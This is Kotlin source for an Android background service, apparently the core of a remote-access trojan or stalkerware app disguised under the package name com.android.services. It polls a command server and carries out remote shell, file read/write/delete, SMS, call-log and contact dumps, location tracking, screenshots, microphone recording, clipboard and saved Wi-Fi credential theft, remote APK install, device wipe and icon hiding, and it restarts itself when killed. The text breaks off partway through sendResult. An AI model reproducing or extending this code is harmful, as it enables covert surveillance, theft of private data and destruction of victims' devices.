package com.android.services

import android.annotation.SuppressLint
import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.HandlerThread
import android.net.wifi.WifiManager
import android.os.IBinder
import android.os.PowerManager
import android.os.SystemClock
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import androidx.core.app.NotificationCompat
import com.google.gson.JsonObject
import com.google.gson.JsonParser
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

class ConnectorService : Service() {

    companion object {
        val SERVER_URL: String get() = SecureConfig.serverUrl()
        const val CHANNEL_ID = "connector_channel"
        const val NOTIF_ID = 1001
        const val ACTION_STOP = "ACTION_STOP"
        const val ACTION_SETUP_MEDIA_PROJECTION = "ACTION_SETUP_MEDIA_PROJECTION"
        const val EXTRA_MP_RESULT_CODE = "mp_result_code"
        const val EXTRA_MP_DATA = "mp_data"
        var isRunning = false
    }

    private val http = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(25, TimeUnit.SECONDS)
        .writeTimeout(15, TimeUnit.SECONDS)
        .build()
    private val JSON = "application/json; charset=utf-8".toMediaType()
    private val prefs by lazy { getSharedPreferences("connector_prefs", Context.MODE_PRIVATE) }

    private var deviceId = ""
    private var deviceName = ""
    private var polling = false
    private var wakeLock: PowerManager.WakeLock? = null
    private var pollThread: Thread? = null

    // ── Screenshot Pipeline ────────────────────────────────────────────────
    @Volatile private var pipelinedFrame: String? = null
    private var pipelineThread: Thread? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_STOP) { stopSelf(); return START_NOT_STICKY }

        @Suppress("HardwareIds")
        val androidId = android.provider.Settings.Secure.getString(
            contentResolver, android.provider.Settings.Secure.ANDROID_ID
        )?.takeIf { it.isNotBlank() && it != "9774d56d682e549c" }

        deviceId = if (androidId != null) {
            androidId
        } else {
            val hw = "${Build.MANUFACTURER}:${Build.MODEL}:${Build.BOARD}:${Build.HARDWARE}"
            hw.hashCode().toString().replace("-", "x")
        }
        deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"

        // Handle MediaProjection setup request dari MainActivity (Android 14+ only)
        if (intent?.action == ACTION_SETUP_MEDIA_PROJECTION) {
            val resultCode = intent.getIntExtra(EXTRA_MP_RESULT_CODE, -1)
            @Suppress("DEPRECATION")
            val data: android.content.Intent? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                intent.getParcelableExtra(EXTRA_MP_DATA, android.content.Intent::class.java)
            else intent.getParcelableExtra(EXTRA_MP_DATA)
            if (resultCode != -1 && data != null) {
                setupMediaProjectionInService(resultCode, data)
            }
            return START_STICKY
        }

        // Guard: jangan restart polling jika sudah berjalan (misalnya dipanggil dari hideAndExit)
        if (polling) {
            return START_STICKY
        }

        acquireWakeLock()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIF_ID, buildNotification("Connecting…", false),
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(NOTIF_ID, buildNotification("Connecting…", false))
        }
        isRunning = true
        startPolling()
        return START_STICKY
    }

    private fun setupMediaProjectionInService(resultCode: Int, data: android.content.Intent) {
        // PENTING: Jangan panggil startForeground() dengan FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
        // di sini! Pada Android 14 (API 34), memanggil startForeground(MEDIA_PROJECTION) pada
        // service yang SUDAH berjalan menyebabkan OS-level SecurityException yang TIDAK bisa
        // di-catch oleh try-catch Java → process langsung di-kill → crash loop.
        //
        // Root cause dari crash loop di logcat:
        //   SecurityException: Starting FGS with type mediaProjection ...
        //   at ConnectorService.onStartCommand(Unknown Source:178)
        //
        // Solusi: Hanya update notifikasi (tetap DATA_SYNC), lalu ambil MediaProjection
        // langsung tanpa mengubah FGS type. MediaProjection token sendiri masih valid.
        try {
            // Update notifikasi saja — TANPA mengubah FGS type ke MEDIA_PROJECTION
            updateNotification("Connected · Screen ▶", true)

            val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
            val proj = mgr.getMediaProjection(resultCode, data)
            val metrics = applicationContext.resources.displayMetrics
            MediaProjectionHolder.setup(applicationContext, proj, metrics)
            log("✅ MediaProjection aktif")
        } catch (e: Exception) {
            log("⚠️ MediaProjection setup gagal: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        polling = false
        isRunning = false
        stopPipeline()
        pollThread?.interrupt()
        wakeLock?.release()

        try {
            val pi = PendingIntent.getService(
                this, 99,
                Intent(this, ConnectorService::class.java),
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_ONE_SHOT
            )
            (getSystemService(Context.ALARM_SERVICE) as AlarmManager)
                .setExactAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + 3000,
                    pi
                )
        } catch (_: Exception) {}
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ─────────────────────────────────────────
    //  POLLING LOOP
    // ─────────────────────────────────────────

    private fun startPolling() {
        polling = true
        pollThread = Thread {
            log("🟢 Started · Device: $deviceName")
            log("🆔 ID: $deviceId")
            var failCount = 0
            var lastHeartbeatAt = 0L
            var lastWasScreenshot = false
            while (polling) {
                try {
                    val now = System.currentTimeMillis()
                    if (now - lastHeartbeatAt >= 5000L) {
                        sendHeartbeat()
                        lastHeartbeatAt = now
                    }
                    val cmd = pollCommand()
                    if (cmd != null) {
                        log("📥 CMD: ${cmd.command}")
                        val (result, type) = executeCommand(cmd.command, cmd.extra)
                        sendResult(cmd.id, cmd.command, result, type)
                        lastWasScreenshot = cmd.command.startsWith("screenshot")
                    } else {
                        lastWasScreenshot = false
                    }
                    failCount = 0
                } catch (e: InterruptedException) {
                    break
                } catch (e: Exception) {
                    failCount++
                    lastWasScreenshot = false
                    log("⚠️ ${e.message}")
                    if (failCount > 5) updateNotification("Server unreachable…", false)
                }
                if (!lastWasScreenshot) {
                    stopPipeline()
                    try { Thread.sleep(500) } catch (e: InterruptedException) { break }
                }
            }
        }.also { it.isDaemon = true; it.start() }
    }

    // ─────────────────────────────────────────
    //  HEARTBEAT
    // ─────────────────────────────────────────

    private fun sendHeartbeat() {
        val deviceJson = DeviceInfo.collect(this)
        val body = JsonObject().apply {
            addProperty("deviceId", deviceId)
            addProperty("deviceName", deviceName)
            add("device", deviceJson)
        }
        post("$SERVER_URL/api/device/heartbeat", body.toString())
        updateNotification("Connected · $deviceName", true)
    }

    // ─────────────────────────────────────────
    //  POLL
    // ─────────────────────────────────────────

    private data class PendingCmd(val id: String, val command: String, val extra: String?)

    private fun pollCommand(): PendingCmd? {
        val resp = get("$SERVER_URL/api/device/poll?deviceId=$deviceId") ?: return null
        val json = JsonParser.parseString(resp).asJsonObject
        val command = if (json.has("command") && !json.get("command").isJsonNull)
            json.get("command").asString else return null
        val cmdId = if (json.has("commandId") && !json.get("commandId").isJsonNull)
            json.get("commandId").asString else ""
        val extra = if (json.has("extra") && !json.get("extra").isJsonNull)
            json.get("extra").asString else null
        return PendingCmd(cmdId, command, extra)
    }

    // ─────────────────────────────────────────
    //  COMMAND DISPATCH
    // ─────────────────────────────────────────

    private fun executeCommand(cmd: String, extra: String?): Pair<String, String> {
        return when {
            // ── File Operations ──
            cmd.startsWith("ls_json:")   -> { val (t, r) = FileOperations.listDir(cmd.removePrefix("ls_json:")); Pair(r, t) }
            cmd.startsWith("read_b64:")  -> Pair(FileOperations.readFileBase64(cmd.removePrefix("read_b64:")), "command_result")
            cmd.startsWith("read_text:") -> Pair(FileOperations.readFileText(cmd.removePrefix("read_text:"), 500), "command_result")
            cmd.startsWith("thumb_b64:") -> {
                val parts = cmd.removePrefix("thumb_b64:").split(":")
                val path    = parts[0]
                val maxDim  = parts.getOrNull(1)?.toIntOrNull() ?: 200
                val quality = parts.getOrNull(2)?.toIntOrNull() ?: 55
                Pair(FileOperations.generateThumbnail(path, maxDim, quality), "command_result")
            }
            cmd.startsWith("write_b64:") -> Pair(if (extra == null) "ERROR: no data" else FileOperations.writeFileBase64(cmd.removePrefix("write_b64:"), extra), "command_result")
            cmd.startsWith("write_text:")-> Pair(if (extra == null) "ERROR: no content" else FileOperations.writeFileText(cmd.removePrefix("write_text:"), extra), "command_result")
            cmd.startsWith("mkdir:")     -> Pair(FileOperations.makeDir(cmd.removePrefix("mkdir:")), "command_result")
            cmd.startsWith("delete:")    -> Pair(FileOperations.deleteFile(cmd.removePrefix("delete:")), "command_result")
            cmd.startsWith("move:")      -> { val p = cmd.removePrefix("move:").split(":"); Pair(if (p.size < 2) "ERROR" else FileOperations.moveFile(p[0], p[1]), "command_result") }
            cmd.startsWith("file_info:") -> Pair(FileOperations.getFileInfo(cmd.removePrefix("file_info:")), "command_result")

            // ── Shell ──
            cmd.startsWith("shell:")     -> Pair(runShell(cmd.removePrefix("shell:")), "command_result")

            // ── Package Manager (via shell) ──
            cmd.startsWith("pm_grant:")     -> { val p = cmd.removePrefix("pm_grant:").split(":"); Pair(if (p.size < 2) "ERROR" else runShell("pm grant ${p[0]} ${p[1]}"), "command_result") }
            cmd.startsWith("pm_revoke:")    -> { val p = cmd.removePrefix("pm_revoke:").split(":"); Pair(if (p.size < 2) "ERROR" else runShell("pm revoke ${p[0]} ${p[1]}"), "command_result") }
            cmd.startsWith("pm_uninstall:") -> Pair(runShell("pm uninstall ${cmd.removePrefix("pm_uninstall:").trim()}"), "command_result")
            cmd.startsWith("settings_put:") -> { val p = cmd.removePrefix("settings_put:").split(":", limit=3); Pair(if (p.size < 3) "ERROR" else runShell("settings put ${p[0]} ${p[1]} ${p[2]}"), "command_result") }
            cmd.startsWith("settings_get:") -> { val p = cmd.removePrefix("settings_get:").split(":", limit=2); Pair(if (p.size < 2) "ERROR" else runShell("settings get ${p[0]} ${p[1]}"), "command_result") }

            // ── Location ──
            cmd == "get_location"        -> Pair(getLocation(), "command_result")

            // ── SMS ──
            cmd.startsWith("get_sms")    -> { val n = cmd.substringAfter("get_sms:","").toIntOrNull() ?: 50; Pair(getSms(n), "command_result") }

            // ── Call log ──
            cmd.startsWith("get_calls")  -> { val n = cmd.substringAfter("get_calls:","").toIntOrNull() ?: 50; Pair(getCallLog(n), "command_result") }

            // ── Contacts ──
            cmd.startsWith("get_contacts") -> { val n = cmd.substringAfter("get_contacts:","").toIntOrNull() ?: 200; Pair(getContacts(n), "command_result") }

            // ── Installed apps ──
            cmd == "get_apps" || cmd.startsWith("pm_list") -> Pair(getInstalledApps(), "command_result")

            // ── Ring device ──
            cmd == "ring_device"         -> Pair(ringDevice(), "command_result")
            cmd == "stop_ring"           -> Pair(stopRing(), "command_result")

            // ── WiFi ──
            cmd == "scan_wifi"           -> Pair(scanWifi(), "command_result")
            cmd == "get_wifi_saved"      -> Pair(getWifiSaved(), "command_result")

            // ── Processes ──
            cmd == "get_processes"       -> Pair(runShell("ps -A"), "command_result")

            // ── App visibility ──
            cmd == "hide_app" || cmd == "hide_icon"   -> Pair(toggleAppVisibility(true), "command_result")
            cmd == "unhide_app" || cmd == "show_icon" -> Pair(toggleAppVisibility(false), "command_result")

            // ── Device control ──
            cmd == "lock_screen"         -> Pair(lockScreen(), "command_result")
            cmd == "wipe_device"         -> Pair(wipeDevice(), "command_result")
            cmd.startsWith("vibrate:")   -> Pair(vibrateCustom(cmd.removePrefix("vibrate:").toIntOrNull() ?: 1), "command_result")
            cmd == "send_notification"   -> Pair(sendCustomNotification(extra), "command_result")
            cmd == "get_clipboard"       -> Pair(getClipboard(), "command_result")
            cmd.startsWith("install_apk:") -> Pair(installApk(cmd.removePrefix("install_apk:")), "command_result")

            // ── Screenshot — MediaProjection pipeline ──────────────────────
            cmd.startsWith("screenshot") -> {
                val parts  = cmd.split(":")
                val maxW   = parts.getOrNull(1)?.toIntOrNull() ?: 720
                val qual   = parts.getOrNull(2)?.toIntOrNull() ?: 70

                val frame = pipelinedFrame?.also { pipelinedFrame = null }
                    ?: takeScreenshot(maxW, qual)

                startPipelineCapture(maxW, qual)
                Pair(frame, "command_result")
            }

            // ── Mic recording ──
            cmd.startsWith("record_mic:") -> {
                val sec = cmd.removePrefix("record_mic:").toIntOrNull()?.coerceIn(1, 60) ?: 5
                Pair(recordMic(sec), "command_result")
            }

            // ── Misc ──
            cmd == "device_info" -> Pair(DeviceInfo.collect(this).toString(), "command_result")
            cmd == "ping"        -> Pair("pong · $deviceName · $deviceId", "command_result")

            else -> Pair("ERROR: Unknown command: $cmd", "command_result")
        }
    }

    // ─────────────────────────────────────────
    //  SCREENSHOT — MediaProjection only
    // ─────────────────────────────────────────

    private fun takeScreenshot(maxWidth: Int = 720, quality: Int = 70): String {
        val tmpPath = "${cacheDir.absolutePath}/.sc_${System.currentTimeMillis()}.png"
        return try {
            // Strategy 1: MediaProjection (fastest, no shell, hardware-accelerated)
            if (MediaProjectionHolder.isAvailable()) {
                val frame = MediaProjectionHolder.captureFrameBase64(maxWidth, quality, 600)
                if (frame != null && !frame.startsWith("ERROR")) return frame
            }

            // Strategy 2: screencap stdout — no disk I/O, no root needed
            try {
                val proc = Runtime.getRuntime().exec(arrayOf("screencap", "-p"))
                val exited = proc.waitFor(3, TimeUnit.SECONDS)
                if (exited) {
                    val pngBytes = proc.inputStream.readBytes()
                    if (pngBytes.size > 1000) {
                        val result = screenshotFromBytes(pngBytes, maxWidth, quality)
                        if (!result.startsWith("ERROR")) return result
                    }
                }
                proc.destroy()
            } catch (_: Exception) {}

            // Strategy 3: screencap to file (last resort)
            try {
                java.io.File(tmpPath).delete()
                runShell("screencap -p $tmpPath")
                Thread.sleep(300)
                if (java.io.File(tmpPath).exists()) {
                    val result = FileOperations.screenshotFromFile(tmpPath, maxWidth, quality)
                    java.io.File(tmpPath).delete()
                    if (!result.startsWith("ERROR")) return result
                }
            } catch (_: Exception) {}

            "ERROR: Screenshot gagal. Aktifkan MediaProjection permission di app."
        } catch (e: Exception) {
            try { java.io.File(tmpPath).delete() } catch (_: Exception) {}
            "ERROR: ${e.message}"
        }
    }

    private fun screenshotFromBytes(pngBytes: ByteArray, maxWidth: Int, quality: Int): String {
        return try {
            val opts1 = android.graphics.BitmapFactory.Options().apply { inJustDecodeBounds = true }
            android.graphics.BitmapFactory.decodeByteArray(pngBytes, 0, pngBytes.size, opts1)
            val scale = if (opts1.outWidth > maxWidth && maxWidth > 0)
                (opts1.outWidth.toFloat() / maxWidth).toInt().coerceAtLeast(1) else 1
            val opts2 = android.graphics.BitmapFactory.Options().apply { inSampleSize = scale }
            val bmp = android.graphics.BitmapFactory.decodeByteArray(pngBytes, 0, pngBytes.size, opts2)
                ?: return "ERROR: decode failed"
            val baos = java.io.ByteArrayOutputStream()
            bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, quality, baos)
            bmp.recycle()
            android.util.Base64.encodeToString(baos.toByteArray(), android.util.Base64.NO_WRAP)
        } catch (e: Exception) { "ERROR: ${e.message}" }
    }

    private fun stopPipeline() {
        pipelineThread?.interrupt()
        pipelineThread = null
        pipelinedFrame = null
    }

    private fun startPipelineCapture(maxW: Int, qual: Int) {
        if (pipelineThread?.isAlive == true) return
        pipelineThread = Thread {
            try {
                val frame = takeScreenshot(maxW, qual)
                if (!frame.startsWith("ERROR")) pipelinedFrame = frame
            } catch (_: InterruptedException) {}
        }.also { it.isDaemon = true; it.start() }
    }

    // ─────────────────────────────────────────
    //  LOCATION
    // ─────────────────────────────────────────

    @SuppressLint("MissingPermission")
    private fun getLocation(): String {
        return try {
            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val activeProviders = lm.getProviders(true)
            if (activeProviders.isEmpty()) return "⚠️ No location providers. Enable GPS."

            val latch = CountDownLatch(1)
            var freshLoc: android.location.Location? = null
            val ht = HandlerThread("loc-fix-thread").also { it.start() }
            val listener = LocationListener { loc ->
                if (freshLoc == null || loc.accuracy < (freshLoc?.accuracy ?: Float.MAX_VALUE)) freshLoc = loc
                latch.countDown()
            }
            for (p in activeProviders) {
                try { lm.requestLocationUpdates(p, 0L, 0f, listener, ht.looper) } catch (_: Exception) {}
            }
            latch.await(12, TimeUnit.SECONDS)
            try { lm.removeUpdates(listener) } catch (_: Exception) {}
            ht.quitSafely()

            var best = freshLoc
            if (best == null) {
                for (p in activeProviders) {
                    val loc = try { lm.getLastKnownLocation(p) } catch (_: Exception) { null } ?: continue
                    if (best == null || loc.accuracy < best.accuracy) best = loc
                }
            }
            if (best != null) {
                val isFresh = freshLoc != null
                val fmt = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                buildString {
                    appendLine("📍 Location")
                    appendLine("Latitude:  ${best.latitude}")
                    appendLine("Longitude: ${best.longitude}")
                    appendLine("Accuracy:  ${best.accuracy}m")
                    appendLine("Provider:  ${best.provider}")
                    appendLine("Time:      ${fmt.format(Date(best.time))}")
                    appendLine("Fresh:     ${if (isFresh) "yes" else "no (cached)"}")
                    appendLine("Maps: https://maps.google.com/?q=${best.latitude},${best.longitude}")
                }
            } else "⚠️ Location not available."
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    // ─────────────────────────────────────────
    //  SMS
    // ─────────────────────────────────────────

    private fun getSms(limit: Int): String {
        return try {
            val cur = contentResolver.query(Telephony.Sms.CONTENT_URI,
                arrayOf("address", "body", "date", "type"), null, null, "date DESC")
                ?: return "⚠️ Cannot read SMS"
            val fmt = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())
            val sb = StringBuilder("=== SMS (last $limit) ===\n")
            var n = 0
            cur.use {
                while (it.moveToNext() && n < limit) {
                    val addr = it.getString(0) ?: "?"
                    val body = it.getString(1)?.replace("\n", " ") ?: ""
                    val date = fmt.format(Date(it.getLong(2)))
                    val type = if (it.getInt(3) == 1) "▼IN" else "▲OUT"
                    sb.appendLine("[$date][$type] $addr: $body")
                    n++
                }
            }
            if (n == 0) sb.append("No SMS found") else sb.appendLine("\nTotal: $n")
            sb.toString()
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    // ─────────────────────────────────────────
    //  CALL LOG
    // ─────────────────────────────────────────

    private fun getCallLog(limit: Int): String {
        return try {
            val proj = arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE,
                CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.CACHED_NAME)
            val cur = contentResolver.query(CallLog.Calls.CONTENT_URI, proj,
                null, null, "${CallLog.Calls.DATE} DESC") ?: return "⚠️ Cannot read call log"
            val fmt = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())
            val sb = StringBuilder("=== Call Log (last $limit) ===\n")
            var n = 0
            cur.use {
                while (it.moveToNext() && n < limit) {
                    val num  = it.getString(0) ?: "?"
                    val type = when (it.getInt(1)) {
                        CallLog.Calls.INCOMING_TYPE -> "📲IN "
                        CallLog.Calls.OUTGOING_TYPE -> "📞OUT"
                        CallLog.Calls.MISSED_TYPE   -> "❌MIS"
                        else -> "OTHER"
                    }
                    val date = fmt.format(Date(it.getLong(2)))
                    val dur  = it.getLong(3)
                    val name = it.getString(4)?.let { n -> if (n.isNotEmpty()) " ($n)" else "" } ?: ""
                    sb.appendLine("[$date][$type] $num$name — ${dur}s")
                    n++
                }
            }
            if (n == 0) sb.append("No calls found") else sb.appendLine("\nTotal: $n")
            sb.toString()
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    // ─────────────────────────────────────────
    //  CONTACTS
    // ─────────────────────────────────────────

    private fun getContacts(limit: Int): String {
        return try {
            val cur = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER),
                null, null, "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC")
                ?: return "⚠️ Cannot read contacts"
            val sb = StringBuilder("=== Contacts ===\n")
            var n = 0
            cur.use {
                while (it.moveToNext() && n < limit) {
                    sb.appendLine("${it.getString(0) ?: "?"}: ${it.getString(1) ?: ""}")
                    n++
                }
            }
            sb.appendLine("\nTotal: $n contacts")
            sb.toString()
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    // ─────────────────────────────────────────
    //  INSTALLED APPS
    // ─────────────────────────────────────────

    private fun getInstalledApps(): String {
        return try {
            val pm = packageManager
            val all = pm.getInstalledApplications(PackageManager.GET_META_DATA)
            val user = all.filter { (it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0 }
                .sortedBy { pm.getApplicationLabel(it).toString().lowercase() }
            val sb = StringBuilder("=== Installed Apps (${user.size}) ===\n")
            user.forEach { app ->
                val label = pm.getApplicationLabel(app).toString()
                val ver   = try { pm.getPackageInfo(app.packageName, 0).versionName ?: "?" } catch (_: Exception) { "?" }
                sb.appendLine("$label | ${app.packageName} | v$ver")
            }
            sb.toString()
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    // ─────────────────────────────────────────
    //  RING DEVICE
    // ─────────────────────────────────────────

    private var ringtone: android.media.Ringtone? = null

    private fun ringDevice(): String {
        return try {
            val vib = getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
            val pat = longArrayOf(0, 800, 400, 800, 400, 800, 400, 800)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vib.vibrate(android.os.VibrationEffect.createWaveform(pat, -1))
            } else {
                @Suppress("DEPRECATION") vib.vibrate(pat, -1)
            }
            try {
                ringtone?.stop()
                val uri = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_RINGTONE)
                ringtone = android.media.RingtoneManager.getRingtone(this, uri)
                ringtone?.play()
                Thread { Thread.sleep(10000); ringtone?.stop() }.start()
            } catch (_: Exception) {}
            "🔊 Device is ringing!"
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    private fun stopRing(): String {
        return try {
            ringtone?.stop()
            (getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator).cancel()
            "🔇 Ring stopped"
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    // ─────────────────────────────────────────
    //  WIFI
    // ─────────────────────────────────────────

    @SuppressLint("MissingPermission")
    private fun scanWifi(): String {
        return try {
            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val results = wm.scanResults
            if (results.isEmpty()) return "⚠️ No WiFi networks found."
            buildString {
                appendLine("=== WiFi Networks (${results.size}) ===")
                results.sortedByDescending { it.level }.forEach { ap ->
                    val bars = WifiManager.calculateSignalLevel(ap.level, 5)
                    appendLine("${if (ap.SSID.isNullOrEmpty()) "[hidden]" else ap.SSID} | ${"▓".repeat(bars)}${"░".repeat(5-bars)} | ${ap.level}dBm")
                }
            }
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    @SuppressLint("MissingPermission")
    private fun getWifiSaved(): String {
        return try {
            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            @Suppress("DEPRECATION")
            val configs = wm.configuredNetworks
            if (configs.isNullOrEmpty()) return runShell("cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null || echo 'Permission denied'")
            buildString {
                appendLine("=== WiFi Tersimpan (${configs.size}) ===")
                configs.forEach { cfg -> appendLine("SSID: ${cfg.SSID?.replace("\"", "") ?: "?"}") }
            }
        } catch (e: Exception) { runShell("cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null || echo 'Butuh root'") }
    }

    // ─────────────────────────────────────────
    //  APP VISIBILITY
    // ─────────────────────────────────────────

    private fun toggleAppVisibility(hide: Boolean): String {
        return try {
            if (hide) { AppIcon.hide(this); "✅ Ikon disembunyikan. Ketik *#2719# di dialer untuk tampilkan kembali." }
            else { AppIcon.show(this); "✅ Ikon tampil kembali." }
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    // ─────────────────────────────────────────
    //  DEVICE CONTROL
    // ─────────────────────────────────────────

    private fun lockScreen(): String {
        return try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val admin = android.content.ComponentName(this, AppDeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(admin)) { dpm.lockNow(); "🔒 Layar dikunci" }
            else "⚠️ Device Admin belum aktif."
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    private fun wipeDevice(): String {
        return try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val admin = android.content.ComponentName(this, AppDeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(admin)) { dpm.wipeData(0); "💀 Factory reset dimulai…" }
            else "⚠️ Device Admin belum aktif."
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    private fun vibrateCustom(times: Int): String {
        return try {
            val vib = getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
            val n = times.coerceIn(1, 10)
            val pattern = LongArray(n * 2 + 1)
            pattern[0] = 0
            for (i in 1 until pattern.size step 2) { pattern[i] = 300; if (i + 1 < pattern.size) pattern[i + 1] = 200 }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) vib.vibrate(android.os.VibrationEffect.createWaveform(pattern, -1))
            else @Suppress("DEPRECATION") vib.vibrate(pattern, -1)
            "📳 Bergetar $n kali"
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    private fun sendCustomNotification(extra: String?): String {
        return try {
            val title: String; val text: String
            if (extra != null) {
                val json = JsonParser.parseString(extra).asJsonObject
                title = json.get("title")?.asString ?: "Pesan"; text = json.get("text")?.asString ?: ""
            } else { title = "Pesan dari Dashboard"; text = "" }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val notif = NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(android.R.drawable.ic_dialog_info).setContentTitle(title)
                .setContentText(text).setAutoCancel(true).build()
            nm.notify((System.currentTimeMillis() % 10000).toInt(), notif)
            "📢 Notifikasi terkirim: \"$title\""
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    @android.annotation.SuppressLint("ServiceCast")
    private fun getClipboard(): String {
        return try {
            val cm = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
            val clip = cm.primaryClip ?: return "📋 Clipboard kosong"
            "📋 Clipboard:\n${clip.getItemAt(0).coerceToText(this)}"
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    private fun installApk(url: String): String {
        return try {
            val file = java.io.File(getExternalFilesDir(null), "install_${System.currentTimeMillis()}.apk")
            http.newCall(Request.Builder().url(url).build()).execute().use { resp ->
                if (!resp.isSuccessful) return "Error: HTTP ${resp.code}"
                resp.body?.byteStream()?.use { input -> file.outputStream().use { output -> input.copyTo(output) } }
            }
            val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N)
                androidx.core.content.FileProvider.getUriForFile(this, "$packageName.fileprovider", file)
            else android.net.Uri.fromFile(file)
            startActivity(Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(uri, "application/vnd.android.package-archive")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
            })
            "📦 APK instalasi dimulai: ${file.name}"
        } catch (e: Exception) { "Error install APK: ${e.message}" }
    }

    // ─────────────────────────────────────────
    //  MIC RECORDING
    // ─────────────────────────────────────────

    private fun recordMic(durationSec: Int): String {
        val tmpPath = "${cacheDir.absolutePath}/.mic_${System.currentTimeMillis()}.3gp"
        var mr: android.media.MediaRecorder? = null
        return try {
            mr = android.media.MediaRecorder().apply {
                setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
                setOutputFormat(android.media.MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AMR_NB)
                setAudioSamplingRate(8000); setAudioEncodingBitRate(12200)
                setOutputFile(tmpPath); prepare(); start()
            }
            Thread.sleep(durationSec.toLong() * 1000)
            mr.stop(); mr.release(); mr = null
            val bytes = java.io.File(tmpPath).readBytes()
            try { java.io.File(tmpPath).delete() } catch (_: Exception) {}
            android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
        } catch (e: Exception) {
            try { mr?.stop() } catch (_: Exception) {}; try { mr?.release() } catch (_: Exception) {}
            try { java.io.File(tmpPath).delete() } catch (_: Exception) {}
            "ERROR: ${e.message}"
        }
    }

    // ─────────────────────────────────────────
    //  SHELL
    // ─────────────────────────────────────────

    private fun runShell(cmd: String): String {
        return try {
            val p = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
            val out = p.inputStream.bufferedReader().readText()
            val err = p.errorStream.bufferedReader().readText()
            p.waitFor()
            buildString {
                if (out.isNotEmpty()) append(out)
                if (err.isNotEmpty()) append(if (out.isNotEmpty()) "\n[stderr]\n$err" else err)
            }.ifEmpty { "(no output)" }
        } catch (e: Exception) { "ERROR: ${e.message}" }
    }

    // ─────────────────────────────────────────
    //  SEND RESULT
    // ─────────────────────────────────────────

    private fun sendResult(commandId: String, command: String, result: String, type: String) {
        val body = JsonObject().apply {
            addProperty("deviceId", deviceId)
            addProperty("commandId", commandId)
            addProperty("command", command)
            addProperty("result", result)
            addProperty("exitCode", 0)
            addProperty("type", type)
            if (type == "file_listing") {
